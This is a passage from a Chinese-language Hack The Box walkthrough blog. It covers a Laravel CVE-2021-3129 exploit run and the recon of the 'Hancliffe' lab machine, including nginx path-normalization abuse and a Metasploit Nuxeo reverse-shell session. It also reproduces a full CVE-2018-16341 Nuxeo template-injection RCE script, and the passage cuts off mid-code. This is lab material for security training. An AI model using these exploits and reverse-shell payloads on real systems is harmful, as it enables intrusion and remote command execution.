()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞</strong>。这个洞很奇怪，在目标机器上是复现不了的，但是端口转发到本地却可以，可能是目标不出网，无法git clone <a href="https://github.com/ambionics/phpggc.git%E5%90%A7%EF%BC%9A">https://github.com/ambionics/phpggc.git吧：</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; python3 ./CVE-2021-3129.py http://localhost:9003 Monolog/RCE1 <span class="hljs-built_in">id</span><br>[i] Trying to clear logs<br>[+] Logs cleared<br>[+] PHPGGC found. Generating payload and deploy it to the target<br>[+] Successfully converted logs to PHAR<br>[+] PHAR deserialized. Exploited<br><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br>[i] Trying to clear logs<br>[+] Logs cleared<br></code></pre></td></tr></table></figure><p>弹shell也很怪，以往正常情况是弹不回来的，指定一个端口进行输入命令，还需要指定一个端口监听回显：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517135837450.png" alt="image-20220517135837450"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Hancliffe</title>
    <link href="/post/HackTheBox-Hancliffe.html"/>
    <url>/post/HackTheBox-Hancliffe.html</url>
    
    <content type="html"><![CDATA[<h5 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">80/tcp   open  http    nginx 1.21.0<br>|_http-title: Welcome to nginx!<br>|_http-server-header: nginx/1.21.0<br>8000/tcp open  http    nginx 1.21.0<br>|_http-title: HashPass | Open Source Stateless Password Manager<br>|_http-server-header: nginx/1.21.0<br>9999/tcp open  abyss?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: <br>|     Welcome Brankas Application.<br>|     Username: Password:<br>|   NULL: <br>|     Welcome Brankas Application.<br>|_    Username:<br></code></pre></td></tr></table></figure><h5 id="80："><a href="#80：" class="headerlink" title="80："></a>80：</h5><p>nginx的欢迎页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://10.10.11.115<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br>&lt;style&gt;<br>    body &#123;<br>        width: 35em;<br>        margin: 0 auto;<br>        font-family: Tahoma, Verdana, Arial, sans-serif;<br>    &#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;<br>&lt;p&gt;If you see this page, the nginx web server is successfully installed and<br>working. Further configuration is required.&lt;/p&gt;<br><br>&lt;p&gt;For online documentation and support please refer to<br>&lt;a href=<span class="hljs-string">&quot;http://nginx.org/&quot;</span>&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;<br>Commercial support is available at<br>&lt;a href=<span class="hljs-string">&quot;http://nginx.com/&quot;</span>&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;<br><br>&lt;p&gt;&lt;em&gt;Thank you <span class="hljs-keyword">for</span> using nginx.&lt;/em&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>没什么东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://10.10.11.115<br>http://10.10.11.115 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.0], IP[10.10.11.115], Title[Welcome to nginx!], nginx[1.21.0]<br></code></pre></td></tr></table></figure><p>不知道是它的问题还是我的问题：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523023856713.png" alt="image-20220523023856713"></p><p>如果从终端打开链接，会跳转到：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523023936244.png" alt="image-20220523023936244"></p><p>如果直接在浏览器中复制粘贴打开：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523024001194.png" alt="image-20220523024001194"></p><p>意外的信息，java环境，nuxeo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit nuxeo<br>------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                           |  Path<br>------------------------------------------------------------------------- ---------------------------------<br>Nuxeo 6.0/7.1/7.2/7.3 - Remote Code Execution (Metasploit)               | jsp/webapps/41748.rb<br>------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br><br>msf6 &gt; search Nuxeo<br>[-] No results from search<br>msf6 &gt; search CVE-2017-5869<br>[-] No results from search<br>msf6 &gt; <br></code></pre></td></tr></table></figure><p>不过看漏洞利用脚本，它需要用户名需要密码，而我没有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">```bash<br>msf&gt; use exploit/multi/http/nuxeo<br>msf exploit(nuxeo) &gt; <span class="hljs-built_in">set</span> USERNAME user1<br>USERNAME =&gt; user1<br>msf exploit(nuxeo) &gt; <span class="hljs-built_in">set</span> PASSWORD password<br>PASSWORD =&gt; password<br>msf exploit(nuxeo) &gt; <span class="hljs-built_in">set</span> rhost 192.168.253.132<br>rhost =&gt; 192.168.253.132<br>msf exploit(nuxeo) &gt; <span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br>payload =&gt; java/jsp_shell_reverse_tcp<br>msf exploit(nuxeo) &gt; <span class="hljs-built_in">set</span> lhost 192.168.253.1<br>lhost =&gt; 192.168.253.1<br>msf exploit(nuxeo) &gt; exploit<br><br>[-] Handler failed to <span class="hljs-built_in">bind</span> to 192.168.253.1:4444:-  -<br>[*] Started reverse TCP handler on 0.0.0.0:4444<br>[*] Authenticating using user1:password<br>[*] Executing the payload at /nuxeo/nuxeo/QBCefwxQ.jsp.<br>[*] Command shell session 1 opened (172.17.0.2:4444 -&gt;<br>192.168.253.132:43279) at 2017-01-13 14:47:25 +0000<br><br><span class="hljs-built_in">id</span><br>uid=1000(nuxeo) gid=1000(nuxeo)<br><span class="hljs-built_in">groups</span>=1000(nuxeo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)<br><span class="hljs-built_in">pwd</span><br>/var/lib/nuxeo/server<br>```<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523024614555.png" alt="image-20220523024614555"></p><p>该网站是一个 H@$hPa$$实例， H@$hPa$$的思路是将其他密码输入到 H@$hPa$$中，它会帮忙计算生成一个主密码，这样用户就只需要记住主密码，随时随地可以通过 H@$hPa$$网页将密码还原出来。而它的目录结构在<a href="https://github.com/scottparry/hashpass">github</a>能找到。甚至Readme都能对的上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc 10.10.11.115 9999<br>Welcome Brankas Application.<br>Username: admin<br>Password: admin<br>Username or Password incorrect<br></code></pre></td></tr></table></figure><p>9999端口需要我提供一个凭证，而我没有。那目前来说我只能在80端口探测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; feroxbuster -u http://10.10.11.115 -x php,asp,aspx<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance =&gt; /nuxeo/Maintenance/<br>302      GET        0l        0w        0c http://10.10.11.115/Maintenance =&gt; /nuxeo/Maintenance/<br>500      GET       21l       62w      494c http://10.10.11.115/con<br>500      GET       21l       62w      494c http://10.10.11.115/con.aspx<br>500      GET       21l       62w      494c http://10.10.11.115/error%1F_log<br>500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.php<br>500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.asp<br>500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.aspx<br></code></pre></td></tr></table></figure><h5 id="滥用-URI-规范化："><a href="#滥用-URI-规范化：" class="headerlink" title="滥用 URI 规范化："></a>滥用 URI 规范化：</h5><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523131006901.png" alt="image-20220523131006901"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523131118421.png" alt="image-20220523131118421"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523131226620.png" alt="image-20220523131226620"></p><p>nexeo是一个java的cms，而前端是nginx，所以可能存在<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">路径标准化处理问题</a>，如果我进入nuxeo&#x2F;Maintenance&#x2F;..;，会被重定向到<a href="http://10.10.11.115/nuxeo/nxstartup.faces%EF%BC%8C%E8%99%BD%E7%84%B6%E5%AE%83%E4%BE%9D%E6%97%A7%E6%98%AFnginx">http://10.10.11.115/nuxeo/nxstartup.faces，虽然它依旧是nginx</a> 404，但如果我访问&#x2F;maintenance&#x2F;..;&#x2F;nuxeo&#x2F;nxstartup.faces，会被重定向到<a href="http://10.10.11.115/nuxeo/login.jsp%EF%BC%8C%E8%99%BD%E7%84%B6%E5%AE%83%E4%B9%9F%E6%98%AFnginx">http://10.10.11.115/nuxeo/login.jsp，虽然它也是nginx</a> 404。但是如果我在访问&#x2F;maintenance&#x2F;..;&#x2F;nuxeo&#x2F;login.jsp，它会返回站点的404页面：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523131832914.png" alt="image-20220523131832914"></p><p>不管怎么说。80端口似乎存在有一个站点，被人刻意的掩盖了。而不是单纯的nginx欢迎页面那么简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; feroxbuster -u <span class="hljs-string">&#x27;http://10.10.11.115/maintenance/..;&#x27;</span> -x jsp<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..; =&gt; http://10.10.11.115/nuxeo/nxstartup.faces<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/logout<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/user<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/scripts =&gt; /nuxeo/Maintenance/..;/scripts/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/img =&gt; /nuxeo/Maintenance/..;/img/<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/login<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/css =&gt; /nuxeo/Maintenance/..;/css/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/search =&gt; /nuxeo/Maintenance/..;/search/<br>200      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/js<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/pages =&gt; /nuxeo/Maintenance/..;/pages/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/users =&gt; /nuxeo/Maintenance/..;/users/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/resources =&gt; /nuxeo/Maintenance/..;/resources/<br>500      GET      106l      269w     2396c http://10.10.11.115/maintenance/..;/api<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/index.jsp =&gt; http://10.10.11.115/nuxeo/nxstartup.faces<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/directory =&gt; /nuxeo/Maintenance/..;/directory/<br>200      GET      450l      882w        0c http://10.10.11.115/maintenance/..;/login.jsp<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/icons =&gt; /nuxeo/Maintenance/..;/icons/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/widgets =&gt; /nuxeo/Maintenance/..;/widgets/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/layouts =&gt; /nuxeo/Maintenance/..;/layouts/<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/group<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/tinymce =&gt; /nuxeo/Maintenance/..;/tinymce/<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/webservices<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/ws<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/incl =&gt; /nuxeo/Maintenance/..;/incl/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/analytics =&gt; /nuxeo/Maintenance/..;/analytics/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/ui =&gt; /nuxeo/Maintenance/..;/ui/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/Maintenance =&gt; /nuxeo/Maintenance/..;/Maintenance/<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/viewer<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/oauth<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/authentication<br>200      GET       94l      272w     2456c http://10.10.11.115/maintenance/..;/page_not_found.jsp<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/permissions =&gt; /nuxeo/Maintenance/..;/permissions/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/jsf =&gt; /nuxeo/Maintenance/..;/jsf/<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/pagination =&gt; /nuxeo/Maintenance/..;/pagination/<br>401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/startup<br>302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/viewers =&gt; /nuxeo/Maintenance/..;/viewers/<br>[<span class="hljs-comment">####################] - 4m     60000/60000   0s      found:36      errors:1      </span><br>[<span class="hljs-comment">####################] - 4m     60000/60000   205/s   http://10.10.11.115/maintenance/..; </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523133059759.png" alt="image-20220523133059759"></p><p>可以看到一个版本号是10.2。而在10.3以下的NUXEO会存在一个SSTI CVE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nuxeo Authentication Bypass Remote Code Execution &lt; 10.3 using a SSTI - CVE-2018-16341<br></code></pre></td></tr></table></figure><p>我可以在github上寻找到一个POC：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/mpgn/CVE-2018-16341/blob/master/CVE-2018-16341.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nNuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341\n&quot;</span>)<br><br>proxy = &#123;<br>&#125;<br><br>remote = <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span><br><br>ARCH=<span class="hljs-string">&quot;UNIX&quot;</span><br><span class="hljs-comment"># ARCH=&quot;WIN&quot;</span><br><br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSuccess</span>(<span class="hljs-params">r</span>):<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>        m = re.search(<span class="hljs-string">&#x27;login.jsp/pwn(.+?).xhtml&#x27;</span>, r.text)<br>        <span class="hljs-keyword">if</span> m:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(m.group(<span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] Error&quot;</span>)<br>            sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error status code&quot;</span>, r.status_code)<br>        sys.exit()<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Checking template injection vulnerability =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>request1 = remote + <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;-7+7&#125;.xhtml&quot;</span><br>r = requests.get(request1, proxies=proxy, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>checkSuccess(r)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> ARCH == <span class="hljs-string">&quot;UNIX&quot;</span>:<br>            command = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;command (\033[92m&quot;</span> + ARCH + <span class="hljs-string">&quot;\033[0m)&gt; &quot;</span>)<br>            command += <span class="hljs-string">&#x27;&gt;command.txt&#x27;</span><br>            command = base64.b64encode(command.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            command_str = command.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            command_str = command_str.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Copy file to tmp directory =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + \<br>                <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;,null).invoke(null,null).exec(\&quot;cp%20/etc/passwd%20/tmp/passwd\&quot;,null).waitFor()&#125;.xhtml&quot;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            checkSuccess(r)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Preparing file =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + \<br>                <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;,null).invoke(null,null).exec(\&quot;sed%20-i%201cpwn%20/tmp/passwd\&quot;,null).waitFor()&#125;.xhtml&quot;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            checkSuccess(r)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Cleaning temp file =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + \<br>                <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;,null).invoke(null,null).exec(\&quot;sed%20-i%20/[^pwn]/d%20/tmp/passwd\&quot;,null).waitFor()&#125;.xhtml&quot;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            checkSuccess(r)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Writing command into temp file =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + <span class="hljs-string">&#x27;/nuxeo/login.jsp/pwn$&#123;&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;sed%20-i%201s/pwn/&#123;echo,&#x27;</span> + \<br>                command_str + \<br>                <span class="hljs-string">&#x27;&#125;|&#123;base64,-d&#125;&gt;pwn.txt/g%20/tmp/passwd&quot;,null).waitFor()&#125;.xhtml&#x27;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            checkSuccess(r)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Decode base64 command =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + \<br>                <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;,null).invoke(null,null).exec(\&quot;bash%20/tmp/passwd\&quot;,null).waitFor()&#125;.xhtml&quot;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            checkSuccess(r)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Executing command =&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            request1 = remote + \<br>                <span class="hljs-string">&quot;/nuxeo/login.jsp/pwn$&#123;\&quot;\&quot;.getClass().forName(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;,null).invoke(null,null).exec(\&quot;bash%20pwn.txt\&quot;,null).waitFor()&#125;.xhtml&quot;</span><br>            r = requests.get(request1, proxies=proxy,<br>                            verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                m = re.search(<span class="hljs-string">&#x27;login.jsp/pwn(.+?).xhtml&#x27;</span>, r.text)<br>                <span class="hljs-keyword">if</span> m:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(m.group(<span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;KO&quot;</span>, <span 